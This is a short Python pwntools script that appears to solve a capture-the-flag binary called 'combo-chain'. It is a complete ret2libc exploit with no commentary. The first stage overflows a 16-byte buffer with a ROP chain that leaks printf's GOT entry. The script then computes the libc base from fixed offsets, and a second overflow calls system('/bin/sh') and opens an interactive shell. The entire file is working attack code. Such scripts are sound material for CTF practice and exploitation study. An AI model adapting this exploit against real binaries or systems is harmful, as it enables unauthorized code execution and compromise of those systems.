#!/usr/bin/env python3 

from pwn import *

# Connect
elf = ELF('./combo-chain')
libc = ELF('./libc6_2.31-6_amd64.so')
p = process('./combo-chain')

# Addresses from the binary
main_addr = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']

# Gadgets to use
pop_rdi = 0x0000000000401263
pop_rsi_r15 = 0x0000000000401261
pop_rdx = 0
nop = 0x000000000040114f

# Payload to call printf
payload = b'A'*16
payload += p64(nop) #16 byte stack alignment requires nop or ret to push it down 8
payload += p64(pop_rdi) + p64(printf_got)
payload += p64(printf_plt)
payload += p64(main_addr)

p.sendlineafter("!: ", payload)

# Leaking the address
leak = int.from_bytes(p.recv(6), byteorder="little")
print(hex(leak))

# Offsets
printf_libc_offset = 0x56c90
system_libc_offset = 0x48df0
bin_sh_libc_offset = 0x18a156

# Finding libc base                                                                                               
libc_base = leak - printf_libc_offset

# System and bin/sh addresses
system_addr = libc_base + system_libc_offset
bin_sh = libc_base + bin_sh_libc_offset

# Final payload to overflow the buffer
payload = b'A'*16
payload += p64(nop)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(system_addr)

p.sendlineafter('!: ', payload)
p.interactive()

